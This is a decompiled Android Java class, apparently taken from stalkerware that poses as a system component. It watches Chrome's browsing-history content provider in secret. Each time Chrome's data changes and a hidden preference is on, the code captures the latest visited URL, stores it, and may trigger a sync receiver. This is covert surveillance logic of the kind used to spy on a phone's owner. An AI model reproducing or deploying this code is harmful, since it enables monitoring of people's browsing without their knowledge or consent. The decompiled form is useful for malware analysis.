package com.app.system.common.c;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import com.android.system.SyncAndFlushReceiver;
import com.app.system.common.a.c;
import com.app.system.common.entity.URLHistory;
import com.app.system.common.h.n;
import java.util.HashMap;
import java.util.Map;

public class b
  extends d
{
  private static final Map<String, URLHistory> b = new HashMap(4);
  
  public void a(Context paramContext)
  {
    b(paramContext);
  }
  
  public void b(final Context paramContext)
  {
    if (this.a == null)
    {
      this.a = new ContentObserver(null)
      {
        public void onChange(boolean paramAnonymousBoolean)
        {
          com.security.d.a.d("Url", "found new url from chrome.", new Object[0]);
          try
          {
            Thread localThread = new java/lang/Thread;
            a locala = new com/app/system/common/c/b$1$a;
            locala.<init>(this);
            localThread.<init>(locala);
            localThread.start();
          }
          catch (Exception localException)
          {
            com.security.d.a.d("Url", localException.getMessage(), new Object[0]);
          }
        }
        
        class a
          implements Runnable
        {
          a() {}
          
          public void run()
          {
            try
            {
              if (b.1.this.a.getSharedPreferences("pref", 0).getBoolean("url-active", false))
              {
                if (com.app.system.common.f.a.b(b.1.this.a) == 1) {
                  SyncAndFlushReceiver.c(b.1.this.a);
                }
                Object localObject1 = new com/app/system/common/a/c;
                ((c)localObject1).<init>(b.1.this.a);
                localObject1 = ((c)localObject1).a();
                if (localObject1 != null)
                {
                  Object localObject2 = new com/app/system/common/h/n;
                  ((n)localObject2).<init>(b.1.this.a);
                  if (((n)localObject2).a((URLHistory)localObject1))
                  {
                    localObject2 = new java/lang/StringBuilder;
                    ((StringBuilder)localObject2).<init>();
                    ((StringBuilder)localObject2).append("Add url: ");
                    ((StringBuilder)localObject2).append(localObject1);
                    com.security.d.a.d("Url", ((StringBuilder)localObject2).toString(), new Object[0]);
                  }
                }
              }
            }
            catch (Exception localException)
            {
              com.security.d.a.a("Url", localException.getMessage(), new Object[0]);
            }
          }
        }
      };
      paramContext.getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/bookmarks"), true, this.a);
    }
  }
  
  public void c(Context paramContext)
  {
    paramContext.getContentResolver().unregisterContentObserver(this.a);
    this.a = null;
  }
}


/* Location:              ~/com/app/system/common/c/b.class
 *
 * Reversed by:           J
 */